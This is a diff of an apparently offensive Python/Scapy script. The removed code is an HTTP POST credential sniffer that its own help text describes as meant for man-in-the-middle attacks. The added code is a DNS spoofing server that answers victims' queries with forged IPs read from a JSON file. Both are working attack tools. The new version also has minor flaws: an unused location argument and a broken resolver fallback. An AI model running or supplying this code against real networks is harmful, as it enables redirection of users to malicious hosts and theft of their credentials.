@@ -1,49 +1,92 @@
-#!/bin/python3
 import argparse
-from scapy.layers.http import HTTPRequest
-from scapy.layers.inet import IP
-from scapy.packet import Raw
-from scapy.sendrecv import sniff
+import json
+import socket
+
+from scapy.arch import get_if_addr
+from scapy.config import conf
+from scapy.layers import dns
+from scapy.layers.dns import DNSRR, DNS
+from scapy.layers.inet import IP, UDP
+from scapy.sendrecv import send, sniff
 
 
-class bcolors:
-    HEADER = '\033[95m'
-    OKBLUE = '\033[94m'
-    OKCYAN = '\033[96m'
-    OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
-    ENDC = '\033[0m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
+class DNSServer:
+    __dictDomains: dict
+    __ip: str
 
+    def __init__(self, location=None):
+        self.__dictDomains = {}
+        self.setDomainsList(location)
+        self.__ip = get_if_addr(conf.iface)
 
-def credentialsSniffing(packet):
-    try:
-        if packet.haslayer(HTTPRequest) and packet[HTTPRequest].Method.decode() == "POST" and packet.haslayer(Raw):
-            url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
-            ipVictim = packet[IP].src
-            try:
-                credentials = packet[Raw].load.decode("utf-8")
-            except:
-                credentials = packet[Raw].load
+    def setDomainsList(self, location):
+        if location is None:
+            location = "domains.txt"
+        f = open(location, "r")
+        self.__dictDomains = json.load(f)
+        try:
+            del self.__dictDomains["domain"]
+        except:
+            pass
 
-            print(f'{bcolors.OKBLUE}---New HTTP POST---{bcolors.ENDC}')
-            print(f"{bcolors.FAIL}[*]{bcolors.ENDC} From: {ipVictim} {bcolors.WARNING}{credentials} {bcolors.ENDC}{bcolors.UNDERLINE}{url}{bcolors.ENDC}")
-    except:
-        pass
+    def getDNSIP(self):
+        return self.__ip
+
+    @staticmethod
+    def generatePacket(packet, host, resolvedIP, ip, udp):
+        dns_response = \
+            IP(src=ip.dst, dst=ip.src) / \
+            UDP(
+                sport=udp.dport,
+                dport=udp.sport
+            ) / \
+            DNS(
+                id=packet[DNS].id,
+                qr=1,
+                aa=0,
+                rcode=0,
+                qd=packet.qd,
+                an= DNSRR
+                    (rrname=host + ".",
+                    ttl=330,
+                    type="A",
+                    rclass="IN",
+                    rdata=resolvedIP)
+                )
+        return dns_response
+
+    def listener(self, packet):
+        ip = packet.getlayer(IP)
+        udp = packet.getlayer(UDP)
+
+        if hasattr(packet, 'qd') and packet.qd is not None:
+            host = packet.qd.qname[:-1].decode("utf-8")
+            if host is not None:
+                if host in self.__dictDomains:
+                    resolvedIP = self.__dictDomains[host]
+                    print("[*] Spoofing DNS request. Now %s ip are %s !!!!" % (host, resolvedIP))
+                else:
+                    try:
+                        resolvedIP = socket.gethostbyname(host)
+                        #print("[*] Spoofing DNS request. Now %s ip are %s !!!!" % (host, resolvedIP))
+                    except:
+                        try:
+                            resolvedIP = dns.resolver.resolve(host, 'A')
+                            #print("[*] Spoofing DNS request. Now %s ip are %s !!!!" % (host, resolvedIP))
+                        except:
+                            resolvedIP = None
+
+                # DNS response
+                if resolvedIP is not None:
+                    #print("Resolved DNS request for %s to %s for %s" % (host, resolvedIP, ip.src))
+                    send(self.generatePacket(packet, host, resolvedIP, ip, udp))
+                else:
+                    return
 
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="This script is a plain text credentials sniffer. It will show you HTTP POST. "
-                                                 "It is developed to be used in man in the middle attacks (maybe with a dhcp server?). "
-                                                 "If you are using it with a dhcp server, you need to enable forwarding.")
-    parser.add_argument("-l", "--location", required=False, help="Location of the domains .txt. This file need to be in JSON format. ")
-    parser.add_argument("-i", "--interface", required=False, help="Network interface")
-    args = parser.parse_args()
-    print("Sniffing HTTP credentials...")
-    if args.interface is None:
-        sniff(filter="tcp and (port 80)", prn=credentialsSniffing)
-    else:
-        sniff(iface=args.interface, filter=f"tcp and port 80", prn=credentialsSniffing)
-
+    parser = argparse.ArgumentParser(description="This script is a DNS server.")
+    parser.add_argument("-l", "--location", required=False, help="Location of the domains.txt. This file need to be in JSON format. ")
+    d = DNSServer()
+    print("DNS server in listening...")
+    sniff(filter="udp port 53 && dst %s" % d.getDNSIP(), prn=d.listener)
